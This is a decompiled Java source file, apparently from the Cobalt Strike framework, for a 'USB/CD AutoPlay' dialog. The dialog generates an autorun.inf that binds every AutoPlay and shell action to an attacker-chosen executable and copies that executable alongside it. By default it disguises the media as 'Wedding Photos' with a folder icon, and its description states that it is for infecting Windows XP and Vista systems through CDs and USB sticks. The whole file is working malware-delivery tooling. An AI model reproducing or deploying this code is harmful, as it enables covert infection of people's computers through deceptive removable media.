package aggressor.dialogs;

import aggressor.MultiFrame;
import common.CommonUtils;
import common.TeamQueue;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;
import java.awt.event.ActionEvent;
import java.io.File;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class AutoRunDialog implements DialogListener, SafeDialogCallback {
   protected MultiFrame window;
   protected JFrame dialog = null;
   protected TeamQueue conn = null;
   protected Map options = null;

   public AutoRunDialog(MultiFrame var1, TeamQueue var2) {
      this.window = var1;
      this.conn = var2;
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      this.options = var2;
      SafeDialogs.openFile("Save AutoPlay files to...", (String)null, (String)null, false, true, this);
   }

   public void dialogResult(String var1) {
      String var2 = (new File(this.options.get("EXE") + "")).getName();
      File var3 = new File(var1);
      var3.mkdirs();
      var3.mkdir();
      StringBuffer var4 = new StringBuffer();
      var4.append("[autorun]\n");
      var4.append("open=" + var2 + "\n");
      var4.append("action=" + this.options.get("Action") + "\n");
      var4.append("icon=" + this.options.get("Icon") + "\n");
      var4.append("label=" + this.options.get("Label") + "\n");
      var4.append("shell\\Open\\command=" + var2 + "\n");
      var4.append("shell\\Explore\\command=" + var2 + "\n");
      var4.append("shell\\Search...\\command=" + var2 + "\n");
      var4.append("shellexecute=" + var2 + "\n");
      var4.append("UseAutoPlay=1\n");
      CommonUtils.writeToFile(new File(var3, "autorun.inf"), CommonUtils.toBytes(var4.toString()));
      CommonUtils.copyFile(this.options.get("EXE") + "", new File(var1, var2));
      DialogUtils.showInfo("Created autorun.inf in " + var1 + ".\nCopy files to root of USB drive or burn to CD.");
   }

   public void show() {
      this.dialog = DialogUtils.dialog("USB/CD AutoPlay", 640, 480);
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      var1.set("Action", "Open folder to view files");
      var1.set("Label", "Wedding Photos");
      var1.set("Icon", "%systemroot%\\system32\\shell32.dll,4");
      var1.text("Label", "Media Label:", 20);
      var1.text("Action", "AutoPlay Action:", 20);
      var1.text("Icon", "AutoPlay Icon:", 20);
      var1.file("EXE", "Executable:");
      JButton var2 = var1.action("Launch");
      JButton var3 = var1.help("https://www.cobaltstrike.com/help-usb-autoplay-attack");
      this.dialog.add(DialogUtils.description("This package generates an autorun.inf that abuses the AutoPlay feature on Windows. Use this package to infect Windows XP and Vista systems through CDs and USB sticks."), "North");
      this.dialog.add(var1.layout(), "Center");
      this.dialog.add(DialogUtils.center(var2, var3), "South");
      this.dialog.pack();
      this.dialog.setVisible(true);
   }
}
